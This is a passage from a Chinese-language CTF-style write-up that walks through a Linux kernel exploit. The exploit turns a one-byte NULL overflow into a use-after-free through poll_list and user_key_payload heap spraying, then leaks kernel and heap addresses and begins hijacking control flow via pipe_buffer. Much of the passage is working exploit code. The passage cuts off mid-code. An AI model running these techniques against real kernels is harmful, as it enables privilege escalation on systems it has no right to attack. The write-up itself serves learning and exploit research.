class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs do_sys_poll">....<br>poll_initwait(&amp;table);<br>fdcount = do_poll(head, &amp;table, end_time);<br>poll_freewait(&amp;table);<br> <br> ....<br><br>out_fds:<br>walk = head-&gt;next;<br>while (walk) &#123;<br>struct poll_list *pos = walk;<br>walk = walk-&gt;next;<br>kfree(pos);<br>&#125;<br><br>....<br>&#125;<br></code></pre></td></tr></table></figure><p>在我们将所有传入的 <code>poll_list</code>复制到内核空间之后，调用 <code>do_poll()</code>函数来监视我们提供的文件描述符，直到发生特定事件或者计时器到期，这里的 <code>end_time</code>就是我们 <code>poll</code>系统调用 所传入的第三个参数，也就是说只要我们愿意，该 <code>poll_list</code>内存块可以在内核中长期存在。</p><p>在 <code>do_poll()</code>函数调用完毕后，他将会接着调用 <code>poll_freewait()</code>函数来进行阻塞，直到发生事件或者计时器到期，在此之后会进行状态的写入，然后在 while 循环中释放我们的 <code>poll_list</code>，而这里如果 <code>walk-&gt;next</code>不为空的化，那么该kfree将会持续，所以<strong>我们这里要么是合法object，要么是NULL</strong></p><p>由于调用 <code>poll</code>系统调用会阻塞自身，因此我们尝试使用线程来帮助我们完成这一工作 :)</p><p>这里可以写一个通用的模板来方便我们使用</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N_STACK_PPS 240</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POLL_LIST_SIZE 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POLLFD_SIZE 8;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE 4096</span><br><br><span class="hljs-type">pthread_mutex_t</span> mutex = PTHREAD_MUTEX_INITIALIZER;<br><span class="hljs-type">int</span> poll_tid[<span class="hljs-number">0x1000</span>];<br><span class="hljs-type">int</span> fds[<span class="hljs-number">0x100</span>];  <span class="hljs-comment">//monitor target fd</span><br><span class="hljs-type">int</span> poll_threads;<br><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">poll_args</span>&#123;<br>    <span class="hljs-type">int</span> t_id;           <span class="hljs-comment">//thread_id</span><br>    <span class="hljs-type">int</span> size;           <span class="hljs-comment">//the size you want to allocated</span><br>    <span class="hljs-type">int</span> timeout;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">alloc_poll_list</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span></span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">pollfd</span> *pfds;<br>    <span class="hljs-type">int</span> id, want_size, timeout, nfds;<br>    id = ((<span class="hljs-keyword">struct</span> poll_args *)args)-&gt;t_id;<br>    want_size = ((<span class="hljs-keyword">struct</span> poll_args *)args)-&gt;size;<br>    timeout = ((<span class="hljs-keyword">struct</span> poll_args *)args)-&gt;timeout;<br>    <br>    <span class="hljs-comment">/* nfds need modify :) */</span><br>    want_size = want_size - ((want_size/PAGE_SIZE)+<span class="hljs-number">1</span>)*POLL_LIST_SIZE;<br>    nfds = (N_STACK_PPS + want_size)/POLLFD_SIZE;<br>    <br>    pfds = <span class="hljs-built_in">calloc</span>(nfds, <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> pollfd));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nfds; i++)&#123;<br>        pfds[<span class="hljs-number">0</span>].fd = fds[<span class="hljs-number">0</span>];<br>        pfds[<span class="hljs-number">0</span>].events = POLLERR;<br>    &#125;<br><br>    <span class="hljs-built_in">pthread_mutex_lock</span>(&amp;mutex);<br>    poll_threads++;<br>    <span class="hljs-built_in">pthread_mutex_unlock</span>(&amp;mutex);<br>    <br>    <span class="hljs-built_in">poll</span>(pfds, nfds, timeout);<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">create_poll_thread</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">size_t</span> size, <span class="hljs-type">int</span> timeout)</span></span>&#123;<br>    <span class="hljs-keyword">if</span>(id &lt; <span class="hljs-number">0</span> || size &lt; <span class="hljs-number">0</span> || timeout &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x]create_poll_thread: Wrong argument!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* Include the poll_list head */</span><br>    <span class="hljs-keyword">if</span>(!(size%PAGE_SIZE == <span class="hljs-number">0</span> || size%PAGE_SIZE &lt; <span class="hljs-number">0x10</span>))&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x]create_poll_thread: size you want have to be suitable!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">poll_args</span> *args;<br>    args = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> poll_args));<br>    args-&gt;t_id = id;<br>    args-&gt;size = size;<br>    args-&gt;timeout = timeout;<br>    <span class="hljs-built_in">pthread_create</span>((<span class="hljs-type">void</span> *)&amp;poll_tid[id], <span class="hljs-number">0</span>, (<span class="hljs-type">void</span> *)alloc_poll_list, (<span class="hljs-type">void</span> *)args); <br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">join_poll_threads</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; poll_threads; i++ )&#123;<br>        <span class="hljs-built_in">pthread_join</span>(poll_tid[i], <span class="hljs-literal">NULL</span>);<br>    &#125;<br>    poll_threads = <span class="hljs-number">0</span>;<br>&#125;<br><br><br>[...]<br><br>    fds[<span class="hljs-number">0</span>] = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, O_RDONLY);<br>    <span class="hljs-built_in">create_poll_thread</span>(<span class="hljs-number">0</span>, <span class="hljs-number">4096</span> + <span class="hljs-number">4096</span> + <span class="hljs-number">32</span>, <span class="hljs-number">3000</span>);<br>    <span class="hljs-built_in">join_poll_threads</span>();<br><br>[...]<br><br></code></pre></td></tr></table></figure><h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><h2 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h2><p>仅仅一个NULL字节的溢出能够给我带来什么呢，我们想到最容易利用的就是指针了，如果说我们零字节可以覆盖一个结构体的第一个字节，并且该结构体的第一个字段为一个指针的化，那么我们就完成了一个指针的重定向，但是我们怎么能保证 <code>0xdeadbeef</code>和 <code>0xdeadbe00</code>都是合法指针且能为我们所用呢？</p><p>不必惊慌，堆喷会为我们解决这一切。</p><p>我们都知道，分配出来的slab都是以一个page为单位的，并且我们可以找到许多结构体，他们的大小可以被0x100所整除，例如 <code>seq_operation</code>、 它的地址末一字节只有可能有以下几种情况 <code>0x00、0x20、0x40、0x60、0x80、0xa0、0xc0、0xe0</code>,因此如果说我们可以堆喷这样的一类结构体，然后将其中某个结构体的低一子节覆盖为 <code>\x00</code>，那么就会造成两个指针指向同一块地址的情况</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/562c11dfa9ec8a132ffdfad4b103918fa0ecc01b.jpg"></p><p>知道了这个利用技巧，那么我们就来构造环境。</p><p>我们第一步首先是要选则恰当的结构体，上面举出的简单例子是0x20大小的结构体，恰好可以作为我们的目标，但是这还不够，还记得上面说到的在释放 <code>poll_list</code>的过程当中，如果 <code>walk-&gt;next</code>指针不为空，则会一直释放下去的事情吗，因此如果说我们的该结构体首8字节不为 <code>NULL</code>的化，那么很有可能在释放 <code>poll_list</code>的过程当中访问到非法地址导致panic，因此这里我们选择一个弹性大小的 <code>user_key_payload</code>结构体，他的首字段 <code>user_key_payload.rcu</code>在分配初期并不会进行初始化，很适合我们使用。</p><p>但虽说不会初始化，但难保其中不存有原先便存在的值，所以在堆喷 <code>user_key_payload</code>之前我们需要先用0将object的内容进行覆盖，出题者所给出的解决方案就是在 <code>add_key</code>之前使用 <code>setxattr</code>系统调用来首先分配出一个object然后覆盖其中的值为0，然后由于setxattr系统调用的特性，在结束后会自动将刚才申请的堆块进行释放，然后使得该堆块被分配为  <code>user_key_payload</code></p><h2 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h2><h3 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1.前期准备"></a>1.前期准备</h3><p>首先我们需要利用程序当中模块的漏洞，由于在上面的大致思路已经讲解，我们首先堆喷 <code>seq_operations</code>结构体，将我们 kmalloc-32的slab进行清洗，清洗完成后就可以开始堆喷我们的 <code>victim struct</code>，也就是 <code>user_key_payload</code>，此时现存的slab大致如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SEQ_SPRAY_NR; i++)&#123;<br>    seq_id[i] = alloc_seq_op();<br>    <span class="hljs-keyword">if</span>(seq_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;Allocate the seq_operations failed&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我可以确定其开启了 <code>CONFIG_FREELIST_RANDOM</code>和 <code>CONFIG_FREELIST_HARDENED</code>两个配置，具体可以在调试过程当中发现</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/ac6eddc451da81cb9d4559f91466d01609243167.jpg"></p><p>上面图片截自部分kmalloc-32slab，我们可以看到其中的object有一部分是包含了四个内核地址，这个就是 <code>seq_operations</code>，其他的就是空闲的object，我们可以发现空闲object的next指针是位于0x10偏移处，并且是个很奇怪的值，因此推断肯定是开启了随机值异或的配置:)</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/71cf3bc79f3df8dc5c7655a58b11728b471028bf.jpg"></p><p>因此这样更方便我们之后堆喷user_key_payload，当然在堆喷期间我们需要开启线程堆喷我们的 <code>poll_list</code>，这里需要堆喷的大小为 <code>4096+32</code>,这里注意我们使用到了 <code>setxattr</code>来首先将前8字节清空，具体原因在上面已经讲解， 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">72</span>; i++)&#123;<br>      setxattr(<span class="hljs-string">&quot;/home/user/.bashrc&quot;</span>, <span class="hljs-string">&quot;user.x&quot;</span>, data, <span class="hljs-number">32</span>, XATTR_CREATE);<br>      <span class="hljs-built_in">sprintf</span>(description, <span class="hljs-string">&quot;payload_%d&quot;</span>, i);<br>      <span class="hljs-built_in">memset</span>(buff, i, <span class="hljs-keyword">sizeof</span>(buff));<br>      key_id[i] = key_alloc(description, buff, <span class="hljs-number">0x8</span>);<br>      <span class="hljs-keyword">if</span>(key_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[X]key index %d id is %d\n&quot;</span>, i,key_id[i]);<br>          error_log(<span class="hljs-string">&quot;key alloc failed!&quot;</span>);<br>      &#125;<br>  &#125; <br><br>  info_log(<span class="hljs-string">&quot;Step IV: Spraying the poll_list in type 4096+32...&quot;</span>);<br>  bind_core(<span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">14</span>; i++)&#123;<br>      create_poll_thread(i, <span class="hljs-number">4096</span>+<span class="hljs-number">32</span>, <span class="hljs-number">3000</span>, <span class="hljs-number">0</span>);<br>  &#125;<br>  bind_core(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">while</span>(poll_threads != <span class="hljs-number">14</span>)&#123;&#125;;<br><br>  sleep(<span class="hljs-number">1</span>);<br>  info_log(<span class="hljs-string">&quot;Step V: Spraying remain of the 0x20 user_key_payload...&quot;</span>);<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">72</span>; i &lt; USER_KEY_PAYLOAD_SPRAY_NR; i++)&#123;<br>      setxattr(<span class="hljs-string">&quot;/home/user/.bashrc&quot;</span>, <span class="hljs-string">&quot;user.x&quot;</span>, data, <span class="hljs-number">32</span>, XATTR_CREATE);<br>      <span class="hljs-built_in">sprintf</span>(description, <span class="hljs-string">&quot;payload_%d&quot;</span>, i);<br>      <span class="hljs-built_in">memset</span>(buff, i, <span class="hljs-keyword">sizeof</span>(buff));<br>      key_id[i] = key_alloc(description, buff, <span class="hljs-number">0x8</span>);<br>      <span class="hljs-keyword">if</span>(key_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[X]key index %d id is %d\n&quot;</span>, i,key_id[i]);<br>          error_log(<span class="hljs-string">&quot;key alloc failed!&quot;</span>);<br>      &#125;<br>  &#125;  <br><br></code></pre></td></tr></table></figure><p><img src="http://imgsrc.baidu.com/forum/pic/item/f7246b600c338744fe4ef548170fd9f9d72aa07f.jpg"></p><h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p>构造成上述环境后我们就可以利用我们的漏洞模块，设置size为4096就可以造成一个零字节溢出，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">info_log(<span class="hljs-string">&quot;Step VI: Insert the proc_rw/cormons&#x27;s 4096 object and free random one user_key_payload..&quot;</span>);<br>write(proc_fd, data, <span class="hljs-number">4096</span>); <br>join_poll_threads();<br><br></code></pre></td></tr></table></figure><p><img src="http://imgsrc.baidu.com/forum/pic/item/e61190ef76c6a7ef99c97212bbfaaf51f3de6613.jpg"></p><p>我们也可以通过调试来看看，首先可以查看一下漏洞模块分配到的kmalloc-4k的块</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/8d5494eef01f3a294c110ffadf25bc315c607c2d.jpg"></p><p>其中rax就是我们分配到的4k块，此时仅仅是才分配还没有进行溢出操作，因此我们又接着看了它相邻的4k块，好的，接下来我们执行完 <code>cormon_proc_write</code>函数，查看溢出后的效果</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/8d5494eef01f3a294c190ffadf25bc315c607c35.jpg"></p><p>可以看到确实将相邻 <code>poll_list-&gt;next</code>指针的低一字节覆盖为0，然后我们查看其中目标发现确实是我们的序号为0x8e的 <code>user_key_payload</code></p><p>什么?你说如果碰巧指向了 <code>seq_operations</code>或者 其他的<code>poll_list</code>是不是很难办.</p><p>难办?难办那就别办咯!（掀桌）</p><p><img src="https://th.bing.com/th/id/OIP.tNINfo_Ks7Hur_SWO-3ieAHaFi?pid=ImgDet&rs=1"></p><p>实际上我们堆喷的大部分仍然是user_key_payload，因此出现这种情况并不是很多，若出现了那只能说是一边承认自己脸黑一边重开了(</p><h3 id="3-地址泄露"><a href="#3-地址泄露" class="headerlink" title="3.地址泄露"></a>3.地址泄露</h3><p>好的接下来我们获得了内核当中两个指针分别都指向一个 <code>user_key_payload</code>,此时我们只需要等带 <code>poll_list</code>超时自动释放链条上的所有堆块，这里肯定会将该 <code>victim user_key_payload</code>释放，这样就构造出来UAF供我们使用，此时我们再堆喷 <code>seq_operations</code>来获取它</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">info_log(<span class="hljs-string">&quot;Step VII: Construct UAF by seq_operations...&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = SEQ_SPRAY_NR; i &lt; SEQ_SPRAY_NR + <span class="hljs-number">128</span>; i++)&#123;<br>    seq_id[i] = alloc_seq_op();<br>    <span class="hljs-keyword">if</span>(seq_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;Allocate the seq_operations failed&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="http://imgsrc.baidu.com/forum/pic/item/8d5494eef01f3a294ded10fadf25bc315c607cd9.jpg"></p><p>红色堆块是我们堆喷之后 <code>user_key_payload</code>和 <code>seq_operations</code>同时指向的堆块，此时我们依次读取所有的 <code>user_key_payload</code>，如果读取内容大于最开始分配的8字节则说明找到了该victim，这里又知道 <code>seq_operations</code>结构体偏移0x18处初始化应该为 <code>proc_single_show</code>，他是一个内核全局函数，因此我们可以借此泄露出内核的基地址:)</p><p>但是光泄露出基地址还远远不够，我们仍需要内核堆上的地址才能进行完整的利用,要泄露堆地址我们可以通过 <code>tty_struct</code>结构体来进行，这里存在一个技巧，那就是创建 <code>struct tty_struct</code>的时候会额外创建一个32字节大小的结构体 <code>tty_file_private</code></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">struct</span> <span class="hljs-type">tty_file_private</span> &#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-type">tty_struct</span> *tty;<br><span class="hljs-keyword">struct</span> <span class="hljs-type">file</span> *file;<br><span class="hljs-keyword">struct</span> <span class="hljs-type">list_head</span> list;<br>&#125;;<br></code></pre></td></tr></table></figure><p>其中第一个字段指向与自身绑定的tty_struct，因此我们可以利用这一点来进行溢出</p><p>此时我们释放除了 <code>victim user_key_payload</code>以外的所有 <code>user_key_payload</code>,然后堆喷 <code>struct tty_struct</code> 这样就会变成以下情况</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/314e251f95cad1c825e73813393e6709c93d51a2.jpg"></p><p>这样我们再次读取 <code>victim user_key_payload</code>就会造成堆地址泄露，且这个堆地址是某个 <code>tty_struct</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; USER_KEY_PAYLOAD_SPRAY_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>(i == victim_key_idx) <span class="hljs-keyword">continue</span>;<br>        key_revoke(key_id[i]);<br>        key_unlink(key_id[i]);<br>    &#125;<br>    sleep(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TTY_SPRAY_NR; i++)&#123;<br>        ptmx_id[i] = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);<br>        <span class="hljs-keyword">if</span>(ptmx_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Alloc the ptmx failed...&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(key_read(key_id[victim_key_idx], data, <span class="hljs-number">0x1000</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;read victim key failed&quot;</span>);<br>    &#125;    <br>    <span class="hljs-keyword">if</span>(leak_heap_addr(data) &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;leak heap base failed&quot;</span>);<br>    &#125;<br><br></code></pre></td></tr></table></figure><h3 id="4-劫持执行流"><a href="#4-劫持执行流" class="headerlink" title="4.劫持执行流"></a>4.劫持执行流</h3><p>我们本次选择 <code>pipe_buffer</code>来作为我们的目标，我们现在手上还存在着的一个 <code>victim user_key_payload</code>.这里我们释放所有的 <code>seq_operations</code>，其中也释放掉了 <code>victim user_key_payload</code>，这样以来就又制造出来一个UAF漏洞，然后再堆喷 32字节大小的 <code>poll_list</code>，就会造成以下结果</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/9f2f070828381f300af8499def014c086e06f026.jpg"></p><p>这里注意仍会有一个 <code>poll_list</code>也指向我们的 <code>victim user_key_payload</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">info_log(<span class="hljs-string">&quot;Step IX: Hijack the control stream...&quot;</span>);<br>   <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Free the part2 seq_operations...&quot;</span>);<br>   <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = SEQ_SPRAY_NR; i &lt; SEQ_SPRAY_NR + <span class="hljs-number">128</span>; i++)&#123;<br>       close(seq_id[i]);<br>   &#125;<br>   <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Allocate 32 size poll_list...&quot;</span>);<br>   <span class="hljs-comment">/* these up will free twice the victim user_key_payload */</span><br>   bind_core(<span class="hljs-number">1</span>);<br>   <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">192</span>; i++)&#123;<br>       create_poll_thread(i, <span class="hljs-number">32</span>, <span class="hljs-number">4000</span>, <span class="hljs-number">1</span>);<br>   &#125;<br>   bind_core(<span class="hljs-number">0</span>);<br>   <span class="hljs-keyword">while</span>(poll_threads != <span class="hljs-number">192</span>)&#123;&#125;;<br>   sleep(<span class="hljs-number">1</span>);<br><br></code></pre></td></tr></table></figure><p>然后我们在这里释放掉我们的 <code>victim user_key_payload</code>，这样就会造成一个 <code>poll_list</code>存在UAF，然后我们此时的目的是修改这个 <code>poll_list</code>的next指针，使得时钟到的时候能够自动释放该指针指向的堆块，这里我们将其中的next指针修改为我们之前泄露的某个 <code>tty_struct</code>的地址-0x18，这里减去0x18是为了不让我们之后分配到的 <code>user_key_payload</code>头部的0x18字节影响到，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Free victim user_key_payload to construct poll_list uaf...&quot;</span>);<br>    key_revoke(key_id[victim_key_idx]);<br>    key_unlink(key_id[victim_key_idx]);<br>    ((<span class="hljs-type">size_t</span> *)data)[<span class="hljs-number">0</span>] = page_offset_base - <span class="hljs-number">0x18</span>;<br>    sleep(<span class="hljs-number">1</span>); <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Allocate setxattr and user_key_payload...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; USER_KEY_PAYLOAD_SPRAY_NR; i++)&#123;<br>        setxattr(<span class="hljs-string">&quot;/home/user/.bashrc&quot;</span>, <span class="hljs-string">&quot;user.x&quot;</span>, data, <span class="hljs-number">32</span>, XATTR_CREATE);<br>        <span class="hljs-built_in">sprintf</span>(description, <span class="hljs-string">&quot;payload_%d&quot;</span>, i);<br>        <span class="hljs-built_in">memset</span>(buff, i, <span class="hljs-keyword">sizeof</span>(buff));<br>        key_id[i] = key_alloc(description, buff, <span class="hljs-number">0x8</span>);<br>        <span class="hljs-keyword">if</span>(key_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[X]key index %d id is %d\n&quot;</span>, i,key_id[i]);<br>            error_log(<span class="hljs-string">&quot;key alloc failed!&quot;</span>);<br>        &#125;<br>    &#125; <br><br></code></pre></td></tr></table></figure><p><img src="http://imgsrc.baidu.com/forum/pic/item/908fa0ec08fa513ddc69a8ea7b6d55fbb3fbd9c0.jpg"></p><p>可以看到其中浅灰色的部分就是我们想要达到的效果，这里想要达成修改同之前清洗一样，使用 <code>setxattr</code>的手段对每个分配到的kmalloc-32进行清洗，此时就是变成写 <code>target-0x18</code>，为了避免之后这里的值被修改，因此紧接着再次分配 32字节大小的 <code>user_key_payload</code>进行占位，情况如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/8d5494eef01f3a2973fb12fadf25bc315c607cd7.jpg"></p><p>截至目前，红色快部分的 <code>poll_list</code>的头八字节已经被成功固定为 <code>target-0x18</code></p><p><img src="http://imgsrc.baidu.com/forum/pic/item/728da9773912b31b61420a1dc018367adab4e1dd.jpg"></p><p>此时我们立刻释放所有的 <code>tty_struct</code>，然后堆喷0x400大小的 <code>pipe_buffer</code>，构造如下效果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Free all the tty and alloc pipe_buffer...&quot;</span>);<br>   <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span 